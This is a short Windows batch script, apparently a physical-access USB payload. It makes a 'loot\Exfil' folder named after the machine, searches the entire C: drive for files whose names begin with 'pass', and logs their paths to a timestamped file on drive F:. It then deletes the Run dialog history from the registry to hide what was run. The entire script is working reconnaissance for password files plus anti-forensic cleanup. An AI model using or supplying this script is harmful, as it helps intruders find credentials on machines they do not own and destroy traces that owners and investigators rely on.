
@echo off

REM create a directort to store loot in
mkdir %CD%\loot\Exfil\%COMPUTERNAME%

REM Scan system for any files starting with a passphrase
REM Options: Change scan directory: default "c:\"
REM	     Change scan phrase: default "pass*"

forfiles /P c:\ /s /m pass* -c "cmd /c echo @isdir @fdate @ftime @path @fsize" > F:\loot\Exfil\%COMPUTERNAME%\%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%.txt


REM Delete run window history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f